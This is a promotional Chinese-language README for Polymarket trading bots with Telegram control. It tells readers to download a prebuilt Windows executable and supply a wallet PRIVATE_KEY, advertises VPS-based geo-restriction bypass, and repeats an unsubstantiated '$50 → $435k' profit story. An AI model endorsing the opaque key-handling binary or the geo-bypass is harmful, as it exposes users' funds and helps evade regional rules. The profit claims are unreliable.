# 🚀 Polymarket 交易机器人 Telegram 服务（2026 年更新）

想象一个未来，AI 驱动的机器人超越人类交易者，利用微秒级优势在预测市场中将数据转化为美元。我们的开源 Rust 基础工具，与无缝 Telegram 集成相结合，赋予您潜入这个 Polymarket 交易的远见领域的能力。  
焦点：复制交易、延迟套利、5 分钟周期狙击、市场做市、模拟和低延迟执行，在当前规则下（2026 年 2 月后更新）。

[English](https://github.com/dev-protocol/polymarket-trading-bots-telegram-service/blob/main/README.md) | 中文（简体）| [Русский](https://github.com/dev-protocol/polymarket-trading-bots-telegram-service/blob/main/README-RU.md) | [Deutsch](https://github.com/dev-protocol/polymarket-trading-bots-telegram-service/blob/main/README-DE.md)

---
 <p align="center">
     <a href="mailto:misssilverbeauty0927@gmail.com">
      <img src="https://img.shields.io/badge/Email-misssilverbeauty0927@gmail.com-ef4444?style=flat&logo=gmail&logoColor=white" />
    </a>
    <a href="https://t.me/soulcrancerdev">
      <img src="https://img.shields.io/badge/Telegram-soulcrancerdev-2AABEE?style=flat&logo=telegram&logoColor=white" />
    </a>
    <img src="https://github.com/user-attachments/assets/610ca14e-8a6a-4948-a9ad-642a70ea9391" alt="image" width="700" height="561" />
</p>

## 📹 核心 YouTube 展示 – 当前工作亮点

通过这些演示步入前沿，展示我们的机器人如何利用 AI 和速度重新定义交易。

- ⚡ **延迟套利机器人（Rust，快速构建示例）**：从真实 $50 → $435k BTC 延迟利用案例中逆向工程。本地执行，0.3–0.8% 目标，严格风险规则（每笔交易 0.5% / 每日 2%）。代码 + 设置 walkthrough。  
  [观看视频](https://www.youtube.com/watch?v=jL8cuzkclHg)
<p align="center">
  <img width="700" height="561" alt="image" src="https://github.com/user-attachments/assets/67319cc3-c14c-43d2-9b33-1935a5c94ce3" />
</p>

- ⚡ **5 分钟比特币“上涨或下跌”延迟狙击 / 周期结束狙击**：检测 Binance/Bybit 上的快速变动 → 在赔率更新前进入 Polymarket 5 分钟仓位。涵盖对冲、定价错误、预言机风险、高成交量示例。  
  [观看视频](https://www.youtube.com/watch?v=CipdY9aCCwE)

- ⚙️ **复制交易机器人 – 设置 & Rust 代码库**：完整指南，包括环境变量、策略（PERCENTAGE/FIXED/ADAPTIVE）、预览模式、运行机器人、Rust 优势（速度、可靠性）。  
  [观看视频](https://www.youtube.com/watch?v=QLA1NJL32xs)

## 📚 参考文章 (dev.to) – 深入指南 & 策略分解

这些书面教程提供详细解释、规则更新、代码概念和策略深入分析，与上面的视频完美搭配。

- **如何构建 Polymarket 交易机器人（新规则版）**  
  发表于 2026 年 2 月 26 日
  涵盖 2026 年主要规则变化（移除 500ms  taker 延迟，动态 taker 费用高达 ~1.56%），为什么 taker 机器人现在不可行，转向 maker 策略（零费用 + 回扣）、WebSocket 使用、费用感知签名（`feeRateBps`）、快速取消/替换循环，以及针对 5 分钟 BTC 市场的特定 maker 方法（T-10s 后定向投注）。警告过时的套利策略，并强调低延迟 + 回测。  
  [阅读文章](https://dev.to/soulcrancerdev/how-to-build-a-polymarket-trading-bot-after-new-rules-edition-5h09)

- **在 Polymarket 上将 $50 转为 $435,000：用 Rust 逆向工程延迟套利机器人**  
  发表于 2026 年 3 月 4 日  
  逆向工程真实世界延迟套利案例（$50 → $435k 增长），利用实时数据源（TradingView, CryptoQuant）和 Polymarket 合约之间的 BTC 价格延迟。详细说明 Rust 实现（WebSockets，延迟检测 >0.3%，<100ms 执行）、风险规则（每笔交易 0.5% / 每日 2% 上限），以及 AI 辅助构建过程（Claude 在 40 分钟内）。讨论边缘递减、gas/滑点风险和合规注意事项。  
  [阅读文章](https://dev.to/soulcrancerdev/turning-50-into-435000-on-polymarket-reverse-engineering-a-latency-arbitrage-bot-in-rust-2ak7)

- **击败 Polymarket 的 5 分钟加密货币上涨/下跌市场：延迟 Polymarket 套利交易机器人解释**  
  发表于 2026 年 2 月 26 日  
  解释高成交量 5 分钟 BTC 上涨/下跌市场的延迟套利（早期交易量 > $25M）。机器人使用更快交易所数据（Binance/Bybit）在 Polymarket 赔率调整前检测变动、进入仓位，并对冲 Yes/No 以快速退出。涵盖定价错误示例、对冲机制、风险（波动性、费用、预言机延迟）和 HFT 启发执行。并非无风险；强调速度。  
  [阅读文章](https://dev.to/soulcrancerdev/beating-polymarkets-5-minute-crypto-updown-markets-latency-polymarket-arbitrage-trading-bot-2naj)

## 📱 Telegram 机器人 – 实时、模拟 & 控制界面

直接从聊天中控制交易的未来——无缝、强大且富有远见。

- 🛡️ **周期结束狙击 | Polymarket 5 分钟交易机器人**：延迟狙击 + 纸上/真实模式、阈值自动买入、风险退出、钱包/存款/提现/赎回、实时日志 & 策略配置。  
  [访问机器人](https://t.me/poly5mbot)

- 🎯 **交易模拟器**：无风险策略测试。  
  [访问机器人](https://t.me/poly_copy_tg_bot)

- 🚀 **生产/测试机器人**：类似实时执行，带有模拟/预览模式。  
  [访问机器人](https://t.me/poly_copy_prod_tg_bot)

**Telegram 控制功能**（适用于复制交易 & 其他）：  
- 直接管理配置 & 环境变量  
- 实时健康检查  
- 监控余额 & PnL  
- 即时启动/停止机器人  
- 实时日志流  
- 无需终端/SSH

### 截图 & 演示
- **Telegram UI**：  
  <p float="left">
   <img width="250" height="789" alt="image" src="https://github.com/user-attachments/assets/b15b436a-a7f2-4a47-b970-aa113f294e74" />
   <img width="250" height="789" alt="telegram bot-1" src="https://github.com/user-attachments/assets/cbe68dc3-939a-4856-8a82-8e59d5588b1c" />
   <img width="250" height="789" alt="telegram bot-2" src="https://github.com/user-attachments/assets/3810d21f-8eaa-4503-80ab-eaa54604cc46" />
</p>

- **视频演示**：  

  https://github.com/user-attachments/assets/2e462566-f4cc-45c3-a3b1-6aa7757b0f32

## ✨ 全面关键功能（所有机器人 & 工具）

今天解锁明日交易科技的力量——这些功能将您推进自动化 alpha 和边缘猎取精密的世界。
<p align="center">
  <img width="700" height="414" alt="image" src="https://github.com/user-attachments/assets/1f8d5ccf-1b6b-419b-ac5a-56e2cf1929d9" />
</p>

- 👥 **多交易者支持** — 同时复制/跟随多名成功交易者，实现多元化 alpha  
- 📏 **动态订单大小** — PERCENTAGE（例如交易者大小的 10%）、FIXED（设置 USD 金额）、ADAPTIVE（基于资本缩放）  
- 🔝 **分层乘数** — 为大 vs. 小复制交易应用不同的缩放规则  
- 📊 **准确仓位记账** — 跟踪每个买入/卖出，以保持净仓位正确，即使部分成交或余额变化  
- 📦 **订单批处理 & 聚合** — 将小信号分组为更少、更 gas 高效的大订单  
- ⚡ **亚秒级 / 低延迟监控 & 执行** — Polymarket 上的实时 CLOB 订单放置  
- 🛡️ **滑点防护 & 保护** — 拒绝低于可接受价格阈值的成交  
- 💰 **PnL 跟踪 & 监控** — 实时利润/损失计算（2026 年 2 月添加）  
- 🏥 **健康检查 & 实时状态** — 通过 Telegram（余额、日志、机器人状态）  
- 🔄 **启动/停止 & 配置管理** — 从 Telegram 完全控制，无需本地终端  
- 💾 **MongoDB 支持的持久状态** — 存储交易、仓位、历史，用于回放、分析和恢复  
- 🔍 **延迟套利检测** — 利用价格延迟（例如交易所 vs. Polymarket 赔率）——专用机器人 + 示例  
- ⚡ **周期结束 / 5 分钟狙击** — 快速加密变动检测 → 在“上涨或下跌”市场预调整进入  
- 📈 **市场做市支持** — 库存管理、报价放置、取消/替换、风险控制（独立机器人模块）  
- 🧪 **预览 / 模拟模式** — `PREVIEW_MODE=true` 监控信号而不执行交易（安全测试）  
- 🔐 **风险控制** — 最大/最小订单大小（`MAX_ORDER_SIZE_USD`，`MIN_ORDER_SIZE_USD`）、套利示例中的每笔交易/每日上限  
- 🌐 **多市场 / 对冲意识** — Yes/No 对冲、赎回处理、跨市场兼容性说明  
- 📡 **Telegram UI & 集成** — 配置、监控、日志、钱包操作、策略调整  
- ⏱️ **针对低延迟 VPS 优化** — 到 Polygon 节点的亚 1 ms，GEO 限制绕过（AMS 推荐）

## 🚀 下载 & 快速设置：复制交易 Rust 机器人（Windows）

- **可执行文件**： [polymarket-copy-trading-bot-x86_64.zip](https://github.com/user-attachments/files/25414423/polymarket-copy-trading-bot-x86_64.zip)  
- 解压 → 设置环境变量（见原始列表：`USER_ADDRESSES`、`PRIVATE_KEY`、`RPC_URL`、`MONGO_URI`、`COPY_STRATEGY` 等） → 运行 `.exe`  
- 使用 `PREVIEW_MODE=true` 进行干运行测试

## 🚀 VPS 推荐（低延迟优势必备）

- **Trading VPS** → https://app.tradingvps.io/aff.php?aff=60  
  到 Polygon 的亚 1 ms，加密/HFT 位置，高正常运行时间，帮助 GEO 限制（AMS 受欢迎）

## 📞 联系 & 社区

- 📱 Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev) — 支持、自定义逻辑、更新  
- 🐦 X: [@soulcrancerdev](https://x.com/soulcrancerdev)  

⭐ Star/fork 仓库。欢迎贡献 — 特别是 2026 年后 Polymarket 规则适应、新策略或市场做市增强。

展望您正在构建的优势——机器人不仅仅交易，它们预见未来！
<p align="center">
  <img width="600" height="561" alt="image" src="https://github.com/user-attachments/assets/3059b5c6-62e5-48d2-96f6-0c9953c4bb2a" />
</p>
让我们继续构建优势！ 🚀
